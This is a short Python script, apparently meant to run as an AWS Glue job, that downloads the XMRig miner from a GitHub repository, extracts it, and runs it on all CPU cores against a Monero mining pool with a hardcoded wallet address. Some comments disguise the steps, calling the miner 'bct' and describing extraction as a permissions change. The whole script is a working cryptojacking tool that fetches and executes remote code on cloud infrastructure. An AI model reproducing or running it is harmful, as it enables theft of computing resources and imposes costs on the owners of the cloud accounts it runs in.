import os
import subprocess
import sys
import socket

def run_shell_command(command):
    print(f"Menjalankan perintah: {command}")
    
    # Menjalankan command dan menangkap output
    process = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    # Mencetak output ke AWS CloudWatch Logs
    if process.stdout:
        print("STDOUT:")
        print(process.stdout)
        
    # Menangani error jika perintah gagal
    if process.returncode != 0:
        print("STDERR:")
        print(process.stderr)
        sys.exit(1)

# 1. Mendapatkan ID Perangkat / Nama Worker secara dinamis
# Mengambil Glue Worker ID bawaan AWS, jika tidak ada pakai Hostname sistem
worker_name = os.environ.get('GLUE_WORKER_ID')

if not worker_name:
    try:
        # Menghasilkan nama unik dari nama host (misal: ip-10-0-1-5)
        worker_name = socket.gethostname().split('.')[0]
    except Exception:
        worker_name = "glue-worker-unknown"

print(f"Nama Worker yang digunakan: {worker_name}")

# 2. Mengunduh file bct
run_shell_command("curl -L -O https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz")

# 3. Mengubah izin akses file
run_shell_command("tar -xvf xmrig.tar.gz")

# 4. Menjalankan bct dengan menyisipkan Nama Worker yang sudah didapat
command_run = f"./xmrig --donate-level 1 -o pool.supportxmr.com:3333 -u 86shoUZ9jrrWqKbLyNzzXWKYxLo6y3xdkbGmruh1fUyJSBi4j1a1EA6brvqMMkx8pffTzUmSiiKCwCr41LVn9oGM2Z2NkAk.{worker_name} -a rx/0 -k -t $(nproc --all)"
run_shell_command(command_run)